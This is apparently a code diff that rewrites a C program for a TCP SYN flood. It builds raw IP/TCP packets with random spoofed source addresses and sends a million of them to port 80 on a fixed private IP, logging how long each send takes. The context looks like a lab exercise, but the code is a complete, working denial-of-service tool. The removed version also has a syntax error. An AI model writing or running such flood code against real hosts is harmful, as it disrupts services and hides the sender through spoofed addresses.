@@ -1,121 +1,176 @@
-#include <arpa/inet.h>
-#include <netinet/tcp.h>
-#include <sys/socket.h>
-#include <unistd.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
+
+#include <stdint.h>
 #include <time.h>
+#include<stdio.h>
+#include<string.h> 
+#include<sys/socket.h>
+#include<stdlib.h> 
+#include<errno.h> 
+#include<netinet/tcp.h>	//Provides declarations for tcp header
+#include<netinet/ip.h>	//Provides declarations for ip header
 
-#define NUM_PACKETS 10000
-#define NUM_ITERATIONS 100
 
-void randomIP(char *ip) {
-    sprintf(ip, "%d.%d.%d.%d", rand() % 256, rand() % 256, rand() % 256, rand() % 256);
+
+#define TARGET_IP "10.0.0.17" // IP address of the Apache server
+#define TARGET_PORT 80 // Port of the Apache server
+#define NUM_PACKETS 10000 // Number of packets to send
+#define NUM_ITERATIONS 100 // Number of iterations
+
+struct pseudo_header    //needed for checksum calculation
+{
+	unsigned int source_address;
+	unsigned int dest_address;
+	unsigned char placeholder;
+	unsigned char protocol;
+	unsigned short tcp_length;
+	
+	struct tcphdr tcp;
+};
+
+unsigned short csum(unsigned short *ptr,int nbytes) {
+	register long sum;
+	unsigned short oddbyte;
+	register short answer;
+
+	sum=0;
+	while(nbytes>1) {
+		sum+=*ptr++;
+		nbytes-=2;
+	}
+	if(nbytes==1) {
+		oddbyte=0;
+		*((u_char*)&oddbyte)=*(u_char*)ptr;
+		sum+=oddbyte;
+	}
+
+	sum = (sum>>16)+(sum & 0xffff);
+	sum = sum + (sum>>16);
+	answer=(short)~sum;
+	
+	return(answer);
 }
 
-int randomPort() {
-    return rand() % 8000 + 1000;
-}
+int main (void)
+{
+	//Create a raw socket
+	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
+	//Datagram to represent the packet
+	char datagram[4096] , source_ip[32];
+	//IP header
+	struct iphdr *iph = (struct iphdr *) datagram;
+	//TCP header
+	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
+	struct sockaddr_in sin;
+	struct pseudo_header psh;
 
-void synFlood(char *victim_ip, int victim_port) {
-    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (sockfd < 0) {
-        perror("socket");
-        exit(EXIT_FAILURE);
-    }
-
-    // Set the IP_HDRINCL option to tell the kernel that we are providing
-    // our own IP header rather than having the kernel create one for us
-    int hdrincl = 1;
-    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &hdrincl, sizeof(hdrincl)) < 0) {
-        perror("setsockopt");
-        exit(EXIT_FAILURE);
-    }
-
-    // Set the source and destination addresses for the packet
-    struct sockaddr_in src_addr, dst_addr;
-    memset(&src_addr, 0, sizeof(src_addr));
-    src_addr.sin_family = AF_INET;
-    src_addr.sin_addr.s_addr = inet_addr(victim_ip);
-    src_addr.sin_port = htons(victim_port);
-
-    memset(&dst_addr, 0, sizeof(dst_addr));
-    dst_addr.sin_family = AF_INET;
-    dst_addr.sin_addr.s_addr = inet_addr(victim_ip);
-    dst_addr.sin_port = htons(victim_port);
-
-    // Open the file to write the results
-    FILE *f = fopen("syns_results_p.txt", "a");
+     // Open the file for writing
+    FILE *f = fopen("syns_results_c.txt", "w");
     if (f == NULL) {
-        perror("fopen");
-        exit(EXIT_FAILURE);
+        perror("Error opening file");
+        return 1;
     }
-
+	
+	
     int counter = 0;
-    time_t start_all = time(NULL);
-
+	memset (datagram, 0, 4096);	/* zero out the buffer */
+	long start_all_t = clock();
     for (int i = 0; i < NUM_ITERATIONS; i++) {
-        for (int packet = 0; packet < NUM_PACKETS; packet++) {
-            time_t start_one = time(NULL);
-            char src_ip[16];
-            randomIP(src_ip);
-
-            // Set the TCP header fields
-            struct tcphdr tcp_hdr
-                        memset(&tcp_hdr, 0, sizeof(tcp_hdr));
-            tcp_hdr.th_sport = htons(randomPort());
-            tcp_hdr.th_dport = htons(victim_port);
-            tcp_hdr.th_seq = htonl(rand());
-            tcp_hdr.th_ack = 0;
-            tcp_hdr.th_off = 5;
-            tcp_hdr.th_flags = TH_SYN;
-            tcp_hdr.th_win = htons(65535);
-            tcp_hdr.th_sum = 0;
-
-            // Set the IP header fields
-            struct ip ip_hdr;
-            memset(&ip_hdr, 0, sizeof(ip_hdr));
-            ip_hdr.ip_v = 4;
-            ip_hdr.ip_hl = 5;
-            ip_hdr.ip_tos = 0;
-            ip_hdr.ip_len = htons(sizeof(ip_hdr) + sizeof(tcp_hdr));
-            ip_hdr.ip_id = htons(rand());
-            ip_hdr.ip_off = 0;
-            ip_hdr.ip_ttl = 255;
-            ip_hdr.ip_p = IPPROTO_TCP;
-            ip_hdr.ip_sum = 0;
-            ip_hdr.ip_src.s_addr = inet_addr(src_ip);
-            ip_hdr.ip_dst.s_addr = inet_addr(victim_ip);
-
-            // Create the packet
-            char packet[sizeof(ip_hdr) + sizeof(tcp_hdr)];
-            memcpy(packet, &ip_hdr, sizeof(ip_hdr));
-            memcpy(packet + sizeof(ip_hdr), &tcp_hdr, sizeof(tcp_hdr));
-
-            // Send the packet
-            if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *) &dst_addr, sizeof(dst_addr)) < 0) {
-                perror("sendto");
-                exit(EXIT_FAILURE);
+        for (int j= 0; j < NUM_PACKETS; j++) {
+            char rnd_src[16];
+            int num[4];
+            //RandomIP
+            for (int i = 0; i < 4; i++) {
+                num[i] = (rand() % (256));
             }
 
-            time_t end_one = time(NULL);
-            fprintf(f, "%d->%ld\n", counter, time(NULL) - start_one);
-            counter++;
+            sprintf(rnd_src, "%d.%d.%d.%d", num[0], num[1], num[2], num[3]);
+            long start_one = clock();
+            
+            
+            strcpy(source_ip , rnd_src);
+            
+            sin.sin_family = AF_INET;
+            
+            //The attacker IP and Port
+            sin.sin_port = htons(TARGET_PORT);
+            sin.sin_addr.s_addr = inet_addr (TARGET_IP);
+
+            //Fill in the IP Header
+            iph->ihl = 5;
+            iph->version = 4;
+            iph->tos = 0;
+            iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
+            iph->id = htons(54321);	//Id of this packet
+            iph->frag_off = 0;
+            iph->ttl = 255;
+            iph->protocol = IPPROTO_TCP;
+            iph->check = 0;		//Set to 0 before calculating checksum
+            iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
+            iph->daddr = sin.sin_addr.s_addr;
+            
+            iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+            
+            //TCP Header
+            tcph->source = htons (1234);
+            tcph->dest = htons (80);
+            tcph->seq = 0;
+            tcph->ack_seq = 0;
+            tcph->doff = 5;		/* first and only tcp segment */
+            tcph->fin=0;
+            tcph->syn=1;
+            tcph->rst=0;
+            tcph->psh=0;
+            tcph->ack=0;
+            tcph->urg=0;
+            tcph->window = htons (5840);	/* maximum allowed window size */
+            tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
+                        should fill in the correct checksum during transmission */
+            tcph->urg_ptr = 0;
+            
+            //Now the IP checksum
+            psh.source_address = inet_addr( source_ip );
+            psh.dest_address = sin.sin_addr.s_addr;
+            psh.placeholder = 0;
+            psh.protocol = IPPROTO_TCP;
+            psh.tcp_length = htons(20);
+            
+            memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
+            
+            tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
+            
+            //IP_HDRINCL to tell the kernel that headers are included in the packet
+            int one = 1;
+            const int *val = &one;
+            if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
+            {
+                printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
+                exit(0);
+            }
+                //Send the packet
+                if (sendto (s,		/* our socket */
+                            datagram,	/* the buffer containing headers and data */
+                            iph->tot_len,	/* total length of our datagram */
+                            0,		/* routing flags, normally always 0 */
+                            (struct sockaddr *) &sin,	/* socket addr, just like in */
+                            sizeof (sin)) < 0)		/* a normal send() */
+                {
+                    printf ("error\n");
+                }
+                //Data send successfully
+                else
+                {
+                    counter = counter + 1;
+                    long end_one = clock();
+                    double packet_time = (double) (end_one - start_one) / CLOCKS_PER_SEC;
+                    fprintf(f, "%d Time: %f\n", counter, packet_time);
+                }
+            //}
         }
     }
-
-    time_t end_all = time(NULL);
-    fprintf(f, "total->%ld\n", end_all - start_all);
-    int avg = (end_all - start_all) / NUM_ITERATIONS;
-    fprintf(f, "avg->%d", avg);
-    fclose(f);
+    long end_all_t = clock();
+    double total_time = (double)(end_all_t - start_all_t)/CLOCKS_PER_SEC;
+    fprintf(f, "Elapsed time: %f\n", total_time);
+    fprintf(f, "Average time to send a packet: %f seconds\n", total_time / (NUM_ITERATIONS * NUM_PACKETS));
+	
+	return 0;
 }
-
-int main() {
-    char victim_ip[] = "10.100.102.59";
-    int victim_port = 80;
-    synFlood(victim_ip, victim_port);
-    return 0;
-}
-
